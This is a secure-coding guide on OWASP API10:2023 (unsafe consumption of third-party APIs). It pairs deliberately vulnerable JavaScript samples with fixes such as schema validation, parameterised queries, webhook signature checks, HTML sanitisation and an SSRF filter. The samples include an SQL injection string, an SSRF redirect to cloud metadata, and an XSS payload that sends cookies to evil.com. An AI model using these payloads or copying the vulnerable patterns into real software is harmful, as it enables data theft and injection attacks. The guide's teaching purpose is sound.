# API10:2023 — Unsafe Consumption of Third-Party APIs

> **30-second summary:** Developers trust third-party APIs unconditionally — no input validation on responses, following redirects blindly, passing API responses directly into database queries or shell commands. When a third-party API is compromised or returns unexpected data, your application becomes the attack vector into your users.

## Severity

**Medium-High** — Exploiting this requires compromising a third-party API or performing a MitM attack, but when exploited the impact can be critical (RCE, data injection, SSRF).

## Real-World Incident: SolarWinds (2020)

SolarWinds's Orion build pipeline consumed a third-party package that had been compromised by nation-state attackers. The build system trusted the package without verification, executed its code, and backdoored 18,000 customers' networks including US government agencies. This is the supply chain variant — but the same trust issue applies at runtime when APIs consume external responses.

## Attack Scenarios

### Scenario 1: SQL Injection via Third-Party API Response

```javascript
// Your payment provider returns:
// { customerId: "12345', DROP TABLE orders; --", name: "John" }
// (attacker compromised provider, injected malicious data)

const customer = await paymentAPI.getCustomer(id);

// VULNERABLE — direct interpolation of API response into SQL
const order = await db.query(
  `SELECT * FROM orders WHERE customer_id = '${customer.customerId}'`
);
// Result: DROP TABLE orders executes
```

### Scenario 2: SSRF via Open Redirect

```javascript
// VULNERABLE — following redirects from external API
const avatarUrl = await socialAPI.getUserAvatarUrl(userId);
// API returns: https://evil.com/redirect?to=http://169.254.169.254/latest/meta-data/

const avatar = await fetch(avatarUrl, { follow: 10 }); // follows redirects
// Now fetching AWS instance metadata
```

### Scenario 3: XSS via Unsanitised API Response

```typescript
// VULNERABLE — rendering third-party content as HTML
const review = await reviewsAPI.getLatestReview(productId);

// API compromised; returns:
// { text: "<script>fetch('https://evil.com/'+document.cookie)</script>", rating: 5 }

// Rendering without sanitisation:
document.getElementById('review').innerHTML = review.text;
// Executes the script in every user's browser
```

### Scenario 4: Webhook Payload Injection

```javascript
// VULNERABLE — trusting webhook payloads without validation
app.post('/webhooks/payment', (req, res) => {
  const { amount, userId, status } = req.body;
  
  // No signature verification, no type checking
  await db.query(
    `UPDATE accounts SET balance = balance + ${amount} WHERE user_id = '${userId}'`
  );
});

// Attacker sends: { amount: 999999, userId: "attacker_id", status: "success" }
```

## Fixes

### 1. Validate and Type-Check All API Responses

```typescript
// Use Zod to validate every external API response
import { z } from 'zod';

const CustomerSchema = z.object({
  id: z.string().uuid(),                           // Must be a UUID
  name: z.string().max(200),                        // Bounded length
  email: z.string().email(),                         // Valid email format
  status: z.enum(['active', 'inactive', 'suspended']), // Known values only
  metadata: z.record(z.string()).optional(),
});

type Customer = z.infer<typeof CustomerSchema>;

async function getCustomer(id: string): Promise<Customer> {
  const response = await paymentAPI.getCustomer(id);
  
  // Parse and validate — throws ZodError if schema doesn't match
  return CustomerSchema.parse(response);
}

// Usage: validated, typed customer — safe to use in DB queries
const customer = await getCustomer(customerId);
await db.query('SELECT * FROM orders WHERE customer_id = $1', [customer.id]);
```

### 2. Use Parameterised Queries — Always

```typescript
// Even with validated data, always use parameterised queries
// (defence in depth — schema validation can have edge cases)

async function getOrdersForCustomer(customerId: string) {
  const customer = await getCustomer(customerId); // validated above
  
  // Still parameterised — never interpolate, even "safe" values
  return db.query(
    'SELECT id, amount, created_at FROM orders WHERE customer_id = $1',
    [customer.id]  // parameterised
  );
}
```

### 3. Verify Webhook Signatures

```typescript
// Verify webhooks come from the actual provider
import { createHmac, timingSafeEqual } from 'crypto';

function verifyWebhookSignature(
  payload: string,
  signature: string,
  secret: string
): boolean {
  const expected = createHmac('sha256', secret)
    .update(payload)
    .digest('hex');
  
  // Use timingSafeEqual to prevent timing attacks
  return timingSafeEqual(
    Buffer.from(signature),
    Buffer.from(expected)
  );
}

app.post('/webhooks/payment', express.raw({ type: 'application/json' }), (req, res) => {
  const signature = req.headers['x-webhook-signature'] as string;
  const rawBody = req.body.toString();
  
  if (!verifyWebhookSignature(rawBody, signature, process.env.WEBHOOK_SECRET!)) {
    return res.status(401).json({ error: 'Invalid webhook signature' });
  }
  
  // Safe to parse and process
  const payload = WebhookSchema.parse(JSON.parse(rawBody));
  await processWebhook(payload);
  
  res.json({ received: true });
});
```

### 4. Sanitise Before Rendering

```typescript
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const purify = DOMPurify(window);

// Sanitise ANY external content before rendering as HTML
function renderUserReview(rawReview: string): string {
  return purify.sanitize(rawReview, {
    ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: [],  // No attributes allowed
  });
}

// In your component:
<div dangerouslySetInnerHTML={{ __html: renderUserReview(review.text) }} />
```

### 5. Prevent SSRF from API Responses

```typescript
import { URL } from 'url';
import dns from 'dns/promises';

const PRIVATE_IP_RANGES = [
  /^10\./,
  /^172\.(1[6-9]|2\d|3[01])\./,
  /^192\.168\./,
  /^127\./,
  /^169\.254\./,  // Link-local / AWS metadata
  /^::1$/,        // IPv6 loopback
  /^fc00:/,       // IPv6 private
];

async function safeFetch(urlFromAPI: string): Promise<Response> {
  // 1. Parse the URL
  let parsed: URL;
  try {
    parsed = new URL(urlFromAPI);
  } catch {
    throw new Error('Invalid URL returned by third-party API');
  }
  
  // 2. Only allow HTTPS
  if (parsed.protocol !== 'https:') {
    throw new Error('Only HTTPS URLs are permitted');
  }
  
  // 3. Resolve the hostname and check it's not private
  const addresses = await dns.resolve4(parsed.hostname);
  for (const ip of addresses) {
    if (PRIVATE_IP_RANGES.some(range => range.test(ip))) {
      throw new Error(`URL resolves to private IP: ${ip}`);
    }
  }
  
  // 4. Fetch without following redirects
  return fetch(urlFromAPI, {
    redirect: 'error',  // Never follow redirects
    signal: AbortSignal.timeout(5000),
  });
}
```

### 6. Timeout and Circuit Breaker for External APIs

```typescript
// Prevent slow third-party APIs from taking down your service
class APIClient {
  private failureCount = 0;
  private lastFailure?: Date;
  private readonly THRESHOLD = 5;
  private readonly COOLDOWN_MS = 30_000;

  async call<T>(fn: () => Promise<T>): Promise<T> {
    // Circuit breaker: open circuit if too many failures
    if (this.failureCount >= this.THRESHOLD) {
      const cooldownExpiry = new Date(this.lastFailure!.getTime() + this.COOLDOWN_MS);
      
      if (new Date() < cooldownExpiry) {
        throw new Error('Circuit open: third-party API temporarily unavailable');
      }
      
      this.failureCount = 0; // Reset and try again
    }

    try {
      // Enforce timeout on all external calls
      const result = await Promise.race([
        fn(),
        new Promise<never>((_, reject) =>
          setTimeout(() => reject(new Error('API timeout')), 10_000)
        ),
      ]);

      this.failureCount = 0;
      return result;
    } catch (err) {
      this.failureCount++;
      this.lastFailure = new Date();
      throw err;
    }
  }
}
```

### 7. Audit Third-Party API Permissions

```markdown
## Third-Party API Audit Checklist

For each third-party API you consume:

**Authentication & Authorisation**
- [ ] Using API key rotation (not a permanent key)
- [ ] API key scoped to minimum required permissions
- [ ] Separate API keys per environment (dev/staging/prod)
- [ ] Keys stored in secrets manager, not code

**Response Handling**
- [ ] All responses validated with a schema (Zod/Pydantic)
- [ ] API responses never interpolated directly into queries
- [ ] HTML content from API sanitised before rendering
- [ ] URLs from API verified before fetching

**Webhook Security**
- [ ] Signature verification implemented
- [ ] Replay attack prevention (timestamp + nonce check)
- [ ] Webhook IPs allowlisted (if provider supplies list)

**Resilience**
- [ ] Timeout set on all calls (max 10s)
- [ ] Circuit breaker implemented
- [ ] Fallback behaviour defined (degrade gracefully)
- [ ] Provider status page monitored
```

## Testing

```typescript
describe('Third-Party API Consumption', () => {
  it('rejects malformed API responses', async () => {
    jest.spyOn(paymentAPI, 'getCustomer').mockResolvedValue({
      id: 'not-a-uuid',  // Invalid
      name: 'A'.repeat(201),  // Too long
    } as any);

    await expect(getCustomer('123')).rejects.toThrow();
  });

  it('rejects webhook without valid signature', async () => {
    const response = await request(app)
      .post('/webhooks/payment')
      .send({ amount: 100, userId: 'user123' })
      .set('x-webhook-signature', 'invalid-sig');

    expect(response.status).toBe(401);
  });

  it('blocks SSRF in API-returned URLs', async () => {
    await expect(
      safeFetch('http://169.254.169.254/latest/meta-data/')
    ).rejects.toThrow();
  });

  it('sanitises HTML from third-party review API', () => {
    const malicious = '<script>alert(1)</script><p>Great product!</p>';
    const sanitised = renderUserReview(malicious);
    
    expect(sanitised).not.toContain('<script>');
    expect(sanitised).toContain('<p>Great product!</p>');
  });
});
```

## Learn More

- [API Top 10 README](./README.md)
- [A03: Injection](../web-top10/A03-injection.md)
- [A10: SSRF](../web-top10/A10-ssrf.md)
- [Supply Chain Security](../../05-supply-chain-security/)
- [OWASP API10 Detail](https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/)
